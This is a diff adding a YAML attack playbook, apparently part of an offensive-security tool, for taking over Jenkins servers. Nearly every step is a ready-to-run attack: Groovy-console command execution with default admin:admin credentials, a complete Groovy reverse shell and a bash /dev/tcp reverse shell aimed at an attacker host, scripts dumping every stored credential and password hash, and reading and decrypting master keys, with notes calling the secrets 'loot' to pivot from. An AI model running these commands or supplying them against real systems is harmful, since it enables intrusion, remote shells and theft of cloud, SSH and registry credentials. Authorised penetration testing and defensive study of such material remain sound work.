@@ -1,0 +1,116 @@
+id: cicd-jenkins-script-console
+name: "CI/CD — Jenkins script-console / build-step RCE"
+description: >
+  Jenkins is the gift that keeps giving. Default-config installations
+  expose /script (Groovy console) to ANY authenticated user — instant
+  RCE as the jenkins user, often with cloud / Git / SSH credentials in
+  reach. Even when the console is locked down, the Pipeline DSL inside
+  any job you can edit runs arbitrary Groovy.
+tags: [cicd, jenkins, groovy, rce, post-exploitation]
+difficulty: medium
+
+inputs:
+  - name: jenkins_url
+    description: "Jenkins URL (often /jenkins/, port 8080)."
+    required: true
+
+steps:
+  - id: enumerate_auth
+    name: "Check auth strategy + anonymous access"
+    inline_command: |
+      curl -s '<j>/asynchPeople/' | grep -oE 'href="/[^"]+' | head
+      curl -s '<j>/script' | head
+      curl -s '<j>/api/json?pretty=true' | head -50
+    inputs:
+      j: "${jenkins_url}"
+    notes: |
+      Many Jenkins installs:
+       - allow anonymous read
+       - have signup ON by default
+       - share weak admin password (admin/admin)
+       - expose `/api/json` listing every job/build with users in tracebacks
+
+  - id: script_console
+    name: "RCE via /script Groovy console"
+    inline_command: |
+      curl -X POST '<j>/script' \
+        -u admin:admin \
+        --data-urlencode 'script=println "id".execute().text' \
+        -d 'Submit=Run'
+    inputs:
+      j: "${jenkins_url}"
+    notes: |
+      Returns command stdout in the response page. Try first; if you get
+      `Permission denied` you don't have Overall/RunScripts.
+
+  - id: groovy_reverse_shell
+    name: "Reverse shell from the console"
+    inline_command: |
+      curl -X POST '<j>/script' \
+        -u admin:admin \
+        --data-urlencode 'script=String host="<lhost>"; int port=<lport>; String cmd="/bin/bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();' \
+        -d 'Submit=Run'
+    inputs:
+      j: "${jenkins_url}"
+      lhost: "${attacker_ip}"
+      lport: "4444"
+
+  - id: extract_credentials
+    name: "Extract stored credentials (the real prize)"
+    inline_command: |
+      # Once inside via shell or script console:
+      curl -X POST '<j>/script' \
+        -u admin:admin \
+        --data-urlencode 'script=hudson.model.User.getById("admin", false).getProperty(hudson.security.HudsonPrivateSecurityRealm.Details.class).getPasswordHash()' \
+        -d 'Submit=Run'
+      # Dump every credential in the credential store:
+      curl -X POST '<j>/script' \
+        -u admin:admin \
+        --data-urlencode 'script=com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().each { c -> println(c.id + ": " + c.getClass().getName() + " => " + (c.metaClass.respondsTo(c,"getPassword") ? c.password : (c.metaClass.respondsTo(c,"getSecret") ? c.secret : "n/a"))) }' \
+        -d 'Submit=Run'
+    inputs:
+      j: "${jenkins_url}"
+    notes: |
+      Common loot:
+       - AWS/Azure/GCP cloud-deploy keys
+       - SSH keys for prod servers
+       - Docker registry creds
+       - GitHub PATs
+       - API keys for downstream services
+      Each one is an additional pivot — try them all.
+
+  - id: pipeline_dsl_rce
+    name: "If /script is locked: RCE via Pipeline DSL in any editable job"
+    inline_command: |
+      # Job → Configure → Pipeline → Script. Paste:
+      node {
+        sh 'id; cat /var/lib/jenkins/secrets/master.key'
+        // Or full revshell:
+        sh 'bash -c "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1"'
+      }
+      // → Build Now → RCE as jenkins user
+
+  - id: pillage_workspace
+    name: "Pillage workspaces for plain-text secrets"
+    inline_command: |
+      find /var/lib/jenkins/jobs -name '*.xml' -exec grep -l 'password\|secret\|credentialsId' {} \;
+      cat /var/lib/jenkins/credentials.xml
+      # Decrypt secrets with:
+      java -jar ~/jenkins-decrypt.jar credentials.xml master.key hudson.util.Secret
+
+references:
+  - title: "Jenkins security best practices (Praetorian)"
+    url:   "https://www.praetorian.com/blog/why-jenkins-is-still-an-attackers-easy-target/"
+  - title: "HackTricks — Jenkins"
+    url:   "https://book.hacktricks.wiki/en/network-services-pentesting/8080-pentesting-jenkins.html"
+
+next_chains:
+  - chain: shell-stabilization
+    when:   'reverse shell received'
+    reason: 'Stabilize.'
+  - chain: aws-imds-ssrf
+    when:   'Jenkins on EC2'
+    reason: 'IMDS reachable from inside the build host — full cloud takeover.'
+  - chain: docker-registry-pillage
+    when:   'Docker registry creds extracted'
+    reason: 'Pillage container images.'
